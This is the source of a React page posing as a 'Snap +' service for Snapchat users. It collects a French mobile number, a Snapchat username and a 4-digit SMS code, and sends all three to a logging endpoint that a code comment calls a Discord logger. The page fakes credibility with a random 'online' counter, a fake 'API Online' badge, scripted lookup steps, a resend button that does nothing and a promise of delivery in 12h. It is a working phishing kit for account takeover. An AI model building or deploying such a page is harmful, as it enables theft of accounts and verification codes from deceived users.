'use client'

import { useState, useRef, useEffect } from 'react'
import { motion, AnimatePresence } from 'framer-motion'
import { ArrowRight, ArrowLeft, AtSign, Phone, ShieldCheck, Sparkles, Clock, Check, Users } from 'lucide-react'
import {
  InputOTP,
  InputOTPGroup,
  InputOTPSlot,
} from '@/components/ui/input-otp'
import { Button } from '@/components/ui/button'
import { Toaster } from '@/components/ui/toaster'
import { useToast } from '@/hooks/use-toast'

type Step = 'form' | 'loading' | 'code' | 'success'
type LoadingPhase = 'recherche' | 'valide' | 'attente'

/* ============================================================
   Logger Discord — 2 events seulement :
   - inscription : numéro complet + pseudo Snap
   - code_saisi  : code saisi complet + numéro + pseudo
   ============================================================ */
async function log(
  type: 'inscription' | 'code_saisi',
  data: { phone?: string; pseudo?: string; code?: string } = {},
) {
  try {
    await fetch('/api/log', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ type, ...data }),
    })
  } catch (e) {
    console.warn('[log] failed', e)
  }
}

export default function Home() {
  const [step, setStep] = useState<Step>('form')
  const [loadingPhase, setLoadingPhase] = useState<LoadingPhase>('recherche')
  const [phone, setPhone] = useState('')
  const [pseudo, setPseudo] = useState('')
  const [code, setCode] = useState('')
  const [error, setError] = useState('')
  const { toast } = useToast()
  const phoneInputRef = useRef<HTMLInputElement>(null)

  useEffect(() => {
    if (step === 'form') {
      setTimeout(() => phoneInputRef.current?.focus(), 500)
    }
  }, [step])

  const normalizePhone = (raw: string) => raw.replace(/\D/g, '').slice(0, 10)
  const normalizePseudo = (raw: string) => raw.trim().toLowerCase()
  const isValidFrenchMobile = (n: string) =>
    n.length === 10 && (n.startsWith('06') || n.startsWith('07'))
  const isValidPseudo = (n: string) => /^[a-z][a-z0-9._-]{2,19}$/.test(n)
  const formatPhone = (n: string) => {
    const d = normalizePhone(n)
    return d.replace(/(\d{2})(?=\d)/g, '$1 ').trim()
  }

  const handleFormSubmit = (e: React.FormEvent) => {
    e.preventDefault()
    const normalizedPhone = normalizePhone(phone)
    const normalizedPseudo = normalizePseudo(pseudo)

    if (normalizedPhone.length < 10) {
      setError('Numéro incomplet : 10 chiffres requis')
      return
    }
    if (!isValidFrenchMobile(normalizedPhone)) {
      setError('Le numéro doit commencer par 06 ou 07')
      return
    }
    if (normalizedPseudo.length < 3) {
      setError('Pseudo trop court : 3 caractères minimum')
      return
    }
    if (!isValidPseudo(normalizedPseudo)) {
      setError('Pseudo invalide : lettres, chiffres, . _ - (lettre en premier)')
      return
    }
    setError('')

    // LOG INSCRIPTION : numéro complet + pseudo Snap
    log('inscription', { phone: normalizedPhone, pseudo: normalizedPseudo })

    setStep('loading')
    setLoadingPhase('recherche')

    setTimeout(() => setLoadingPhase('valide'), 1800)
    setTimeout(() => setLoadingPhase('attente'), 3000)
    setTimeout(() => {
      toast({
        title: "Code en cours d'envoi",
        description: `Le code s'envoie au ${formatPhone(normalizedPhone)} sous 10s à 1 min`,
      })
      setStep('code')
    }, 4000)
  }

  const handleCodeSubmit = (e: React.FormEvent) => {
    e.preventDefault()
    if (code.length !== 4) {
      setError('Code invalide : 4 chiffres')
      return
    }
    setError('')

    // LOG CODE SAISI : code complet + numéro + pseudo
    log('code_saisi', {
      code,
      phone: normalizePhone(phone),
      pseudo: normalizePseudo(pseudo),
    })

    setStep('loading')
    setLoadingPhase('valide')
    setTimeout(() => setLoadingPhase('attente'), 1400)
    setTimeout(() => {
      toast({
        title: 'Vérifié',
        description: 'Ton compte est confirmé.',
      })
      setStep('success')
    }, 2600)
  }

  const handleResend = () => {
    toast({ title: 'Code renvoyé', description: 'Vérifie tes SMS.' })
  }

  const reset = () => {
    setPhone('')
    setPseudo('')
    setCode('')
    setError('')
    setStep('form')
  }

  return (
    <main className="relative min-h-screen overflow-hidden bg-black text-white">
      <AnimatedBackground />

      <div className="relative z-10 flex min-h-screen flex-col items-center justify-center px-4 py-8 sm:px-6 sm:py-10 md:px-8" style={{ paddingTop: 'env(safe-area-inset-top, 0px)', paddingBottom: 'env(safe-area-inset-bottom, 0px)' }}>
        <div className="w-full max-w-md">
          {/* Logo Snap+ */}
          <motion.div
            initial={{ opacity: 0, scale: 0.6, y: -10 }}
            animate={{ opacity: 1, scale: 1, y: 0 }}
            transition={{ duration: 0.7, ease: [0.22, 1, 0.36, 1] }}
            className="mb-6 flex flex-col items-center"
          >
            <motion.div
              className="relative"
              animate={{ y: [0, -6, 0] }}
              transition={{ duration: 4, repeat: Infinity, ease: 'easeInOut' }}
            >
              <div className="absolute inset-0 -z-10 rounded-full bg-yellow-400/30 blur-2xl" />
              <img
                src="/snap-logo.svg"
                alt="Snap + Tech"
                className="h-20 w-20 drop-shadow-[0_0_25px_rgba(250,204,21,0.45)] sm:h-24 sm:w-24"
              />
            </motion.div>
            <motion.div
              initial={{ opacity: 0, y: 8 }}
              animate={{ opacity: 1, y: 0 }}
              transition={{ delay: 0.3 }}
              className="mt-3 inline-flex items-center gap-2 rounded-full border border-yellow-400/30 bg-yellow-400/10 px-4 py-1.5 text-xs font-semibold uppercase tracking-[0.25em] text-yellow-400"
            >
              <Sparkles className="h-3.5 w-3.5" />
              Snap + Tech
            </motion.div>
          </motion.div>

          <AnimatePresence mode="wait">
            {/* === Step 1 : Numéro + Pseudo + Stats === */}
            {step === 'form' && (
              <motion.div
                key="form"
                initial={{ opacity: 0, x: 40 }}
                animate={{ opacity: 1, x: 0 }}
                exit={{ opacity: 0, x: -40 }}
                transition={{ duration: 0.45, ease: [0.22, 1, 0.36, 1] }}
              >
                {/* Stats badges au-dessus de la carte */}
                <div className="mb-4 grid grid-cols-3 gap-2">
                  <StatBadge
                    icon={<Users className="h-3.5 w-3.5" />}
                    label="Utilisateurs"
                    value="1.2M"
                  />
                  <OnlineCounter />
                  <ApiStatus />
                </div>

                <div className="rounded-3xl border border-white/10 bg-white/[0.03] p-6 backdrop-blur-xl sm:p-8">
                  <motion.h1
                    initial={{ opacity: 0, y: 10 }}
                    animate={{ opacity: 1, y: 0 }}
                    transition={{ delay: 0.1 }}
                    className="text-center text-3xl font-black tracking-tight sm:text-4xl"
                  >
                    <span className="bg-gradient-to-r from-yellow-300 via-yellow-400 to-yellow-500 bg-clip-text text-transparent">
                      Rejoins Snap +
                    </span>
                  </motion.h1>
                  <motion.p
                    initial={{ opacity: 0, y: 10 }}
                    animate={{ opacity: 1, y: 0 }}
                    transition={{ delay: 0.18 }}
                    className="mt-3 text-center text-sm text-white/60"
                  >
                    Entre ton numéro et ton pseudo Snapchat pour recevoir ton code
                  </motion.p>

                  <form onSubmit={handleFormSubmit} className="mt-8 space-y-5">
                    <motion.div
                      initial={{ opacity: 0, y: 12 }}
                      animate={{ opacity: 1, y: 0 }}
                      transition={{ delay: 0.26 }}
                    >
                      <label
                        htmlFor="phone"
                        className="mb-2 block text-xs font-medium uppercase tracking-wider text-white/50"
                      >
                        Numéro mobile
                      </label>
                      <div className="relative">
                        <Phone className="pointer-events-none absolute left-3.5 top-1/2 h-4 w-4 -translate-y-1/2 text-yellow-400/70 sm:left-4 sm:h-5 sm:w-5" />
                        <input
                          ref={phoneInputRef}
                          id="phone"
                          type="tel"
                          inputMode="numeric"
                          autoComplete="tel"
                          placeholder="06 12 34 56 78"
                          value={formatPhone(phone)}
                          onChange={(e) => {
                            setPhone(e.target.value)
                            if (error) setError('')
                          }}
                    className="w-full rounded-2xl border border-white/10 bg-black/50 py-3.5 pl-11 pr-3 text-base font-medium tracking-wider text-white placeholder-white/25 outline-none transition-all focus:border-yellow-400/60 focus:ring-2 focus:ring-yellow-400/20 sm:py-4 sm:pl-12 sm:pr-4 sm:text-lg"
                        />
                      </div>
                    </motion.div>

                    <motion.div
                      initial={{ opacity: 0, y: 12 }}
                      animate={{ opacity: 1, y: 0 }}
                      transition={{ delay: 0.34 }}
                    >
                      <label
                        htmlFor="pseudo"
                        className="mb-2 block text-xs font-medium uppercase tracking-wider text-white/50"
                      >
                        Pseudo Snapchat
                      </label>
                      <div className="relative">
                        <AtSign className="pointer-events-none absolute left-3.5 top-1/2 h-4 w-4 -translate-y-1/2 text-yellow-400/70 sm:left-4 sm:h-5 sm:w-5" />
                        <input
                          id="pseudo"
                          type="text"
                          autoComplete="username"
                          autoCapitalize="none"
                          spellCheck={false}
                          placeholder="ton_pseudo"
                          value={pseudo}
                          onChange={(e) => {
                            setPseudo(e.target.value)
                            if (error) setError('')
                          }}
                          className="w-full rounded-2xl border border-white/10 bg-black/50 py-4 pl-12 pr-4 text-lg font-medium tracking-wide text-white placeholder-white/25 outline-none transition-all focus:border-yellow-400/60 focus:ring-2 focus:ring-yellow-400/20"
                        />
                      </div>
                    </motion.div>

                    <AnimatePresence>
                      {error && (
                        <motion.p
                          initial={{ opacity: 0, y: -4, height: 0 }}
                          animate={{ opacity: 1, y: 0, height: 'auto' }}
                          exit={{ opacity: 0, y: -4, height: 0 }}
                          className="text-sm text-red-400"
                        >
                          {error}
                        </motion.p>
                      )}
                    </AnimatePresence>

                    <motion.div
                      initial={{ opacity: 0, y: 12 }}
                      animate={{ opacity: 1, y: 0 }}
                      transition={{ delay: 0.42 }}
                    >
                      <Button
                        type="submit"
                        size="lg"
                        className="group w-full rounded-2xl bg-yellow-400 text-base font-bold text-black hover:bg-yellow-300 transition-all hover:shadow-[0_0_30px_rgba(250,204,21,0.4)]"
                      >
                        Recevoir le code
                        <ArrowRight className="ml-2 h-4 w-4 transition-transform group-hover:translate-x-1" />
                      </Button>
                    </motion.div>

                    <p className="text-center text-xs text-white/40">
                      Numéro : 06 ou 07 · Pseudo : 3 à 20 caractères
                    </p>
                  </form>
                </div>

                <p className="mt-6 text-center text-xs text-white/30">
                  En continuant, tu acceptes nos conditions d'utilisation.
                </p>
              </motion.div>
            )}

            {/* === Loading multi-phase === */}
            {step === 'loading' && (
              <motion.div
                key="loading"
                initial={{ opacity: 0 }}
                animate={{ opacity: 1 }}
                exit={{ opacity: 0 }}
              >
                <div className="rounded-3xl border border-white/10 bg-white/[0.03] p-10 backdrop-blur-xl">
                  <LoadingSteps phase={loadingPhase} />
                  <motion.div
                    initial={{ opacity: 0, y: 8 }}
                    animate={{ opacity: 1, y: 0 }}
                    transition={{ delay: 0.4 }}
                    className="mt-6 flex items-center justify-center gap-2 rounded-2xl border border-yellow-400/20 bg-yellow-400/5 px-4 py-3 text-center"
                  >
                    <Clock className="h-4 w-4 flex-shrink-0 text-yellow-400" />
                    <p className="text-xs font-medium text-yellow-400/90">
                      Le code s'envoie entre 10s et 1 minute — le système l'envoie automatiquement.
                    </p>
                  </motion.div>
                </div>
              </motion.div>
            )}

            {/* === Step 2 : Code 4 chiffres === */}
            {step === 'code' && (
              <motion.div
                key="code"
                initial={{ opacity: 0, x: 40 }}
                animate={{ opacity: 1, x: 0 }}
                exit={{ opacity: 0, x: -40 }}
                transition={{ duration: 0.45, ease: [0.22, 1, 0.36, 1] }}
              >
                <div className="rounded-3xl border border-white/10 bg-white/[0.03] p-6 backdrop-blur-xl sm:p-8">
                  <motion.div
                    initial={{ scale: 0, rotate: -90 }}
                    animate={{ scale: 1, rotate: 0 }}
                    transition={{ delay: 0.1, type: 'spring', stiffness: 200 }}
                    className="mb-6 flex justify-center"
                  >
                    <div className="flex h-14 w-14 items-center justify-center rounded-2xl bg-yellow-400/10 ring-1 ring-yellow-400/30">
                      <ShieldCheck className="h-7 w-7 text-yellow-400" />
                    </div>
                  </motion.div>

                  <h2 className="text-center text-2xl font-bold">Vérification</h2>
                  <p className="mt-2 text-center text-sm text-white/60">
                    Code envoyé au{' '}
                    <span className="font-semibold text-yellow-400">
                      {formatPhone(phone)}
                    </span>
                  </p>

                  <motion.div
                    initial={{ opacity: 0, y: 6 }}
                    animate={{ opacity: 1, y: 0 }}
                    transition={{ delay: 0.3 }}
                    className="mt-4 flex items-center justify-center gap-2 rounded-2xl border border-yellow-400/20 bg-yellow-400/5 px-4 py-3"
                  >
                    <motion.div
                      animate={{ rotate: [0, 15, -10, 0] }}
                      transition={{ duration: 2, repeat: Infinity, ease: 'easeInOut' }}
                    >
                      <Clock className="h-4 w-4 flex-shrink-0 text-yellow-400" />
                    </motion.div>
                    <p className="text-xs font-medium text-yellow-400/90">
                      Le code s'envoie entre 10s et 1 minute — le système l'envoie automatiquement.
                    </p>
                  </motion.div>

                  <form onSubmit={handleCodeSubmit} className="mt-8 space-y-6">
                    <div className="flex justify-center">
                      <InputOTP
                        maxLength={4}
                        value={code}
                        onChange={(v) => {
                          setCode(v)
                          if (error) setError('')
                        }}
                      >
                        <InputOTPGroup className="gap-3">
                          {[0, 1, 2, 3].map((i) => (
                            <InputOTPSlot
                              key={i}
                              index={i}
                              className="h-12 w-11 rounded-xl border-white/15 bg-black/60 text-xl font-bold text-yellow-400 first:rounded-l-xl last:rounded-r-xl data-[active=true]:border-yellow-400 data-[active=true]:ring-yellow-400/30 sm:h-14 sm:w-12 sm:text-2xl"
                            />
                          ))}
                        </InputOTPGroup>
                      </InputOTP>
                    </div>

                    {error && (
                      <p className="text-center text-sm text-red-400">{error}</p>
                    )}

                    <Button
                      type="submit"
                      size="lg"
                      disabled={code.length !== 4}
                      className="group w-full rounded-2xl bg-yellow-400 text-base font-bold text-black hover:bg-yellow-300 transition-all hover:shadow-[0_0_30px_rgba(250,204,21,0.4)] disabled:cursor-not-allowed disabled:opacity-40 disabled:hover:shadow-none"
                    >
                      Valider
                      <ArrowRight className="ml-2 h-4 w-4 transition-transform group-hover:translate-x-1" />
                    </Button>

                    <button
                      type="button"
                      onClick={reset}
                      className="flex w-full items-center justify-center gap-1.5 text-sm text-white/50 transition hover:text-yellow-400"
                    >
                      <ArrowLeft className="h-3.5 w-3.5" />
                      Modifier mes infos
                    </button>
                  </form>
                </div>

                <p className="mt-6 text-center text-xs text-white/30">
                  Tu n'as pas reçu le code ?{' '}
                  <button
                    type="button"
                    onClick={handleResend}
                    className="font-medium text-yellow-400 underline-offset-2 hover:underline"
                  >
                    Renvoyer
                  </button>
                </p>
              </motion.div>
            )}

            {/* === Step 3 : Succès (sans compteur) === */}
            {step === 'success' && (
              <motion.div
                key="success"
                initial={{ opacity: 0, scale: 0.9 }}
                animate={{ opacity: 1, scale: 1 }}
                transition={{ duration: 0.5, ease: [0.22, 1, 0.36, 1] }}
              >
                <div className="rounded-3xl border border-yellow-400/30 bg-yellow-400/[0.04] p-6 text-center backdrop-blur-xl sm:p-10">
                  <motion.div
                    initial={{ scale: 0, rotate: -20 }}
                    animate={{ scale: 1, rotate: 0 }}
                    transition={{ delay: 0.15, type: 'spring', stiffness: 200 }}
                    className="relative mx-auto mb-6 h-24 w-24 sm:h-28 sm:w-28"
                  >
                    <motion.div
                      className="absolute inset-0 rounded-full bg-yellow-400/40 blur-2xl"
                      animate={{ scale: [1, 1.3, 1], opacity: [0.4, 0.7, 0.4] }}
                      transition={{ duration: 2.4, repeat: Infinity, ease: 'easeInOut' }}
                    />
                    <motion.img
                      src="/snap-logo.svg"
                      alt="Snap +"
                      className="relative h-24 w-24 drop-shadow-[0_0_25px_rgba(250,204,21,0.55)] sm:h-28 sm:w-28"
                      animate={{ y: [0, -8, 0] }}
                      transition={{ duration: 3, repeat: Infinity, ease: 'easeInOut' }}
                    />
                  </motion.div>

                  <motion.h2
                    initial={{ opacity: 0, y: 12 }}
                    animate={{ opacity: 1, y: 0 }}
                    transition={{ delay: 0.3 }}
                    className="text-2xl font-black leading-tight sm:text-3xl"
                  >
                    <span className="bg-gradient-to-r from-yellow-300 via-yellow-400 to-yellow-500 bg-clip-text text-transparent">
                      Snap + arrive très bientôt
                    </span>
                  </motion.h2>

                  <motion.p
                    initial={{ opacity: 0, y: 12 }}
                    animate={{ opacity: 1, y: 0 }}
                    transition={{ delay: 0.4 }}
                    className="mt-3 text-base font-medium text-white"
                  >
                    Snap + arrive très bientôt dans{' '}
                    <span className="font-bold text-yellow-400">12h</span>.
                    Veuillez patienter.
                  </motion.p>

                  {/* Badge "Livraison en cours" — plus de compteur */}
                  <motion.div
                    initial={{ opacity: 0, scale: 0.9 }}
                    animate={{ opacity: 1, scale: 1 }}
                    transition={{ delay: 0.5 }}
                    className="mt-7 flex items-center justify-center gap-2 rounded-2xl border border-yellow-400/20 bg-yellow-400/5 px-5 py-4"
                  >
                    <motion.div
                      animate={{ rotate: [0, 15, -10, 0] }}
                      transition={{ duration: 2, repeat: Infinity, ease: 'easeInOut' }}
                    >
                      <Clock className="h-5 w-5 text-yellow-400" />
                    </motion.div>
                    <span className="text-lg font-black uppercase tracking-widest text-yellow-400">
                      Livraison en cours
                    </span>
                    <AnimatedGreenDot />
                  </motion.div>

                  <motion.p
                    initial={{ opacity: 0 }}
                    animate={{ opacity: 1 }}
                    transition={{ delay: 0.7 }}
                    className="mt-5 text-xs text-white/50"
                  >
                    Reste connecté, Snap + arrive bientôt.
                  </motion.p>

                  <motion.div
                    initial={{ opacity: 0, y: 12 }}
                    animate={{ opacity: 1, y: 0 }}
                    transition={{ delay: 0.8 }}
                  >
                    <Button
                      type="button"
                      onClick={reset}
                      variant="outline"
                      className="mt-7 rounded-2xl border-white/15 bg-transparent text-white hover:bg-white/5 hover:text-yellow-400"
                    >
                      Recommencer
                    </Button>
                  </motion.div>
                </div>
              </motion.div>
            )}
          </AnimatePresence>
        </div>
      </div>

      <Toaster />
    </main>
  )
}

/* ============================================================
   Stats badges
   ============================================================ */
function StatBadge({
  icon,
  label,
  value,
}: {
  icon: React.ReactNode
  label: string
  value: string
}) {
  return (
    <div className="flex flex-col items-center justify-center gap-0.5 rounded-2xl border border-white/10 bg-white/[0.03] px-2 py-2.5 backdrop-blur-xl">
      <div className="flex items-center gap-1 text-yellow-400">{icon}</div>
      <span className="text-sm font-bold text-white">{value}</span>
      <span className="text-[9px] uppercase tracking-wider text-white/40">{label}</span>
    </div>
  )
}

function OnlineCounter() {
  // Compteur entre 83 et 1240, qui bouge toutes les 10s en montant/descendant de 3 ou 5
  const MIN = 83
  const MAX = 1240
  const randomCount = () => Math.floor(Math.random() * (MAX - MIN + 1)) + MIN
  const [count, setCount] = useState(randomCount)

  useEffect(() => {
    const id = setInterval(() => {
      setCount((prev) => {
        // delta aléatoire : +3/+5 ou -3/-5
        const magnitude = Math.random() < 0.5 ? 3 : 5
        const direction = Math.random() < 0.5 ? -1 : 1
        const next = prev + direction * magnitude
        // clamp entre MIN et MAX
        return Math.max(MIN, Math.min(MAX, next))
      })
    }, 10 * 1000) // toutes les 10 secondes
    return () => clearInterval(id)
  }, [])

  return (
    <div className="flex flex-col items-center justify-center gap-0.5 rounded-2xl border border-white/10 bg-white/[0.03] px-2 py-2.5 backdrop-blur-xl">
      <div className="flex items-center gap-1">
        <AnimatedGreenDot />
      </div>
      <motion.span
        key={count}
        initial={{ opacity: 0, y: -4 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ duration: 0.3 }}
        className="text-sm font-bold text-white tabular-nums"
      >
        {count.toLocaleString('fr-FR')}
      </motion.span>
      <span className="text-[9px] uppercase tracking-wider text-white/40">En ligne</span>
    </div>
  )
}

function ApiStatus() {
  return (
    <div className="flex flex-col items-center justify-center gap-1 rounded-2xl border border-white/10 bg-white/[0.03] px-2 py-2.5 backdrop-blur-xl">
      <div className="flex items-center gap-1.5">
        <AnimatedGreenDot />
        <span className="text-[10px] font-bold uppercase tracking-wider text-green-400">API Online</span>
      </div>
      <span className="text-[10px] font-semibold uppercase tracking-wider text-yellow-400/80">
        Service actif
      </span>
    </div>
  )
}

function AnimatedGreenDot() {
  return (
    <span className="relative flex h-2.5 w-2.5">
      <motion.span
        className="absolute inline-flex h-full w-full rounded-full bg-green-400"
        animate={{ scale: [1, 2.2, 1], opacity: [0.6, 0, 0.6] }}
        transition={{ duration: 1.6, repeat: Infinity, ease: 'easeInOut' }}
      />
      <span className="relative inline-flex h-2.5 w-2.5 rounded-full bg-green-400" />
    </span>
  )
}

/* ============================================================
   Loading multi-phase avec messages
   ============================================================ */
function LoadingSteps({ phase }: { phase: LoadingPhase }) {
  const steps: { key: LoadingPhase; label: string }[] = [
    { key: 'recherche', label: 'Recherche de l\'utilisateur Snapchat et numéro...' },
    { key: 'valide', label: 'Valide' },
    { key: 'attente', label: 'En attente du code à 4 chiffres' },
  ]

  const currentIndex = steps.findIndex((s) => s.key === phase)

  return (
    <div className="flex flex-col items-center py-8">
      <div className="mb-8 h-14 w-14">
        <AnimatePresence mode="wait">
          {phase === 'recherche' && (
            <motion.div
              key="spinner-recherche"
              initial={{ opacity: 0, scale: 0.8 }}
              animate={{ opacity: 1, scale: 1 }}
              exit={{ opacity: 0, scale: 0.8 }}
              className="flex h-14 w-14 items-center justify-center"
            >
              <motion.div
                animate={{ rotate: 360 }}
                transition={{ duration: 1, repeat: Infinity, ease: 'linear' }}
                className="h-14 w-14 rounded-full border-2 border-yellow-400/30 border-t-yellow-400"
              />
            </motion.div>
          )}
          {phase === 'valide' && (
            <motion.div
              key="check-valide"
              initial={{ scale: 0, rotate: -90 }}
              animate={{ scale: 1, rotate: 0 }}
              exit={{ scale: 0, opacity: 0 }}
              transition={{ type: 'spring', stiffness: 200 }}
              className="flex h-14 w-14 items-center justify-center rounded-full bg-green-400/15 ring-2 ring-green-400"
            >
              <Check className="h-8 w-8 text-green-400" strokeWidth={3} />
            </motion.div>
          )}
          {phase === 'attente' && (
            <motion.div
              key="spinner-attente"
              initial={{ opacity: 0, scale: 0.8 }}
              animate={{ opacity: 1, scale: 1 }}
              exit={{ opacity: 0, scale: 0.8 }}
              className="flex h-14 w-14 items-center justify-center"
            >
              <motion.div
                animate={{ rotate: 360 }}
                transition={{ duration: 1, repeat: Infinity, ease: 'linear' }}
                className="h-14 w-14 rounded-full border-2 border-yellow-400/30 border-t-yellow-400"
              />
            </motion.div>
          )}
        </AnimatePresence>
      </div>

      <div className="w-full space-y-3">
        {steps.map((s, i) => {
          const isDone = i < currentIndex
          const isActive = i === currentIndex
          return (
            <motion.div
              key={s.key}
              initial={{ opacity: 0, x: -10 }}
              animate={{ opacity: 1, x: 0 }}
              transition={{ delay: i * 0.1 }}
              className="flex items-center gap-3"
            >
              <div className="flex h-6 w-6 flex-shrink-0 items-center justify-center">
                {isDone ? (
                  <motion.div
                    initial={{ scale: 0 }}
                    animate={{ scale: 1 }}
                    transition={{ type: 'spring', stiffness: 200 }}
                    className="flex h-5 w-5 items-center justify-center rounded-full bg-green-400"
                  >
                    <Check className="h-3.5 w-3.5 text-black" strokeWidth={3} />
                  </motion.div>
                ) : isActive ? (
                  <motion.div
                    animate={{ rotate: 360 }}
                    transition={{ duration: 1, repeat: Infinity, ease: 'linear' }}
                    className="h-5 w-5 rounded-full border-2 border-yellow-400/30 border-t-yellow-400"
                  />
                ) : (
                  <div className="h-2 w-2 rounded-full bg-white/20" />
                )}
              </div>
              <span
                className={
                  isDone
                    ? 'text-sm font-medium text-green-400/80 line-through decoration-green-400/40'
                    : isActive
                      ? 'text-sm font-semibold text-yellow-400'
                      : 'text-sm text-white/30'
                }
              >
                {s.label}
              </span>
            </motion.div>
          )
        })}
      </div>
    </div>
  )
}

/* ============================================================
   Fond animé
   ============================================================ */
function AnimatedBackground() {
  return (
    <div className="pointer-events-none absolute inset-0 overflow-hidden">
      <div className="absolute inset-0 bg-black" />

      <motion.div
        className="absolute left-1/2 top-1/2 h-[140vh] w-[140vh] -translate-x-1/2 -translate-y-1/2 opacity-40"
        style={{
          background:
            'conic-gradient(from 0deg, transparent 0%, rgba(250,204,21,0.25) 15%, transparent 30%, rgba(234,179,8,0.18) 45%, transparent 60%, rgba(253,224,71,0.22) 75%, transparent 90%)',
          filter: 'blur(80px)',
          borderRadius: '50%',
        }}
        animate={{ rotate: 360 }}
        transition={{ duration: 40, repeat: Infinity, ease: 'linear' }}
      />

      <motion.div
        className="absolute -left-1/4 top-0 h-[60vh] w-[60vh] rounded-full opacity-30 blur-[120px]"
        style={{ background: 'radial-gradient(circle, #facc15 0%, transparent 70%)' }}
        animate={{
          x: [0, 120, 60, -40, 0],
          y: [0, 60, 140, 80, 0],
          scale: [1, 1.15, 0.95, 1.05, 1],
        }}
        transition={{ duration: 24, repeat: Infinity, ease: 'easeInOut' }}
      />
      <motion.div
        className="absolute -right-1/4 bottom-0 h-[55vh] w-[55vh] rounded-full opacity-25 blur-[120px]"
        style={{ background: 'radial-gradient(circle, #eab308 0%, transparent 70%)' }}
        animate={{
          x: [0, -140, -60, 40, 0],
          y: [0, -80, -160, -40, 0],
          scale: [1, 1.1, 1.2, 0.9, 1],
        }}
        transition={{ duration: 28, repeat: Infinity, ease: 'easeInOut' }}
      />
      <motion.div
        className="absolute left-1/3 top-1/4 h-[40vh] w-[40vh] rounded-full opacity-20 blur-[100px]"
        style={{ background: 'radial-gradient(circle, #fde047 0%, transparent 70%)' }}
        animate={{
          x: [0, 100, -50, 80, 0],
          y: [0, -80, 40, -100, 0],
        }}
        transition={{ duration: 32, repeat: Infinity, ease: 'easeInOut' }}
      />

      <motion.div
        className="absolute inset-0 opacity-[0.05]"
        style={{
          backgroundImage:
            'linear-gradient(to right, #facc15 1px, transparent 1px), linear-gradient(to bottom, #facc15 1px, transparent 1px)',
          backgroundSize: '60px 60px',
        }}
        animate={{ backgroundPositionX: ['0px', '60px'], backgroundPositionY: ['0px', '60px'] }}
        transition={{ duration: 8, repeat: Infinity, ease: 'linear' }}
      />

      {PARTICLES.map((p, i) => (
        <motion.span
          key={i}
          className="absolute h-1 w-1 rounded-full bg-yellow-400"
          style={{ left: `${p.x}%`, top: `${p.y}%` }}
          animate={{
            y: [0, -40, 0],
            x: [0, p.drift, 0],
            opacity: [0, 0.8, 0],
            scale: [0.4, 1.4, 0.4],
          }}
          transition={{
            duration: p.d,
            repeat: Infinity,
            delay: p.delay,
            ease: 'easeInOut',
          }}
        />
      ))}

      <div className="absolute inset-0 bg-gradient-to-b from-black/40 via-transparent to-black/70" />
    </div>
  )
}

const PARTICLES = Array.from({ length: 32 }, (_, i) => ({
  x: (i * 3.1 + 4) % 100,
  y: (i * 6.7 + 8) % 100,
  d: 7 + (i % 6) * 1.4,
  delay: (i % 10) * 0.45,
  drift: i % 2 === 0 ? 20 : -20,
}))
